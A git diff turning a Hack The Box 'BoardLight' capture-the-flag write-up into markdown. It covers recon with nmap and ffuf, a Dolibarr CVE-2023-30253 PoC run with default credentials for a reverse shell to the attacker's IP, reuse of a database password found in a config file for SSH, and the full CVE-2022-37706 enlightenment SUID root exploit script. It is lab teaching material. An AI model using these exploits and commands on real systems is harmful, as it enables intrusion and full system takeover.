@@ -1,7 +1,15 @@
-Target IP Address: 10.10.11.11
+# BoardLight box
 
-nmap:
+URL: https://app.hackthebox.com/machines/BoardLight
 
+## Reconaissance
+
+Target IP Address: `10.10.11.11`
+
+Use nmap to scan ports.
+
+Results:
+```text
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 63
 80/tcp open  http    syn-ack ttl 63
@@ -21,11 +29,11 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 Access website:
-Website use PHP, Apache/2.4.41 (Ubuntu)
 
-http://10.10.11.11/contact.php
+Website use PHP, Apache/2.4.41 (Ubuntu)
 
 The SEND and Subcribe button don't send any body to the server.
 It seems that no element in the main page of website can be exploited.
@@ -33,43 +41,102 @@ Try to use gobuster to find hidden page.
 
 Use wordlist from https://github.com/danielmiessler/SecLists/
 
+Scan directories:
+```bash
 gobuster dir -u http://10.10.11.11 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
+```
 
-Tuan suggests scan subdomain
-ffuf -u http://board.htb:80/ -t 10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" -mc all -fs 15949 -r -noninteractive -s | tee "/home/kali/htb-boardlight/results/boardlight.htb/scans/tcp80/tcp_80_http_boardlight.htb_vhosts_subdomains-top1million-110000.txt"
+Don't find any dir.
+
+Scan subdomain: don't find any interesting.
 
 Scan vhost:
 
-ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -fc 404 -t 40 -fs 15949 | tee results.txt
+```bash
+ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -fc 404 -t 40 -fs 15949
+```
 
+Got it:
+```text
 crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 66ms]
+```
 
-/etc/hosts
+## Foothold
+Add the vhost to hosts file:
+```text
+# /etc/hosts
 # For HTB
 10.10.11.11 board.htb
 10.10.11.11 crm.board.htb
+```
 
+Access website: http://crm.board.htb
 
 ![alt text](dolibarr.png)
 
-https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
+The version of Dolibarr is 17.0.0. Take some search on Google and found this PoC, but it doesn't work: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
 
-https://github.com/Rubikcuv5/cve-2023-30253
+Found another git repo: https://github.com/Rubikcuv5/cve-2023-30253
 
+The default credential is `admin/admin`. It seems to be a misconfiguration case.
+
+```bash
 python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r  10.10.14.50  8081
+```
 
-successfully.
+Successfully get a reverse shell.
 
-another user: larissa
+Check in `/etc/passwd` and found a user: `larissa`
 
-/var/www/html/crm.board.htb/htdocs/conf/conf.php
+Take some search on configuration files and found this:
+```text
+# /var/www/html/crm.board.htb/htdocs/conf/conf.php
 
 $dolibarr_main_db_user='dolibarrowner';
 $dolibarr_main_db_pass='serverfun2$2023!!';
+```
+Try to login via ssh with `larissa/serverfun2$2023!!`. Successfully.
 
+## Root Escalation
+Check with [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) but don't find any exploitation point.
 
+Try to find suid:
+```bash
 find / -perm -4000 2>/dev/null
+```
 
+Found a binary called `enlightenment`.
+Search on exploit-db and found this exploitation: https://www.exploit-db.com/exploits/51180
 
+```bash
+#!/usr/bin/bash
+# Idea by MaherAzzouz
+# Development by nu11secur1ty
 
+echo "CVE-2022-37706"
+echo "[*] Trying to find the vulnerable SUID file..."
+echo "[*] This may take few seconds..."
 
+# The actual problem
+file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
+if [[ -z ${file} ]]
+then
+	echo "[-] Couldn't find the vulnerable SUID file..."
+	echo "[*] Enlightenment should be installed on your system."
+	exit 1
+fi
+
+echo "[+] Vulnerable SUID binary found!"
+echo "[+] Trying to pop a root shell!"
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+echo "[+] Welcome to the rabbit hole :)"
+
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+
+```
+
+Grab the bash script and execute it -> Got the root flag.
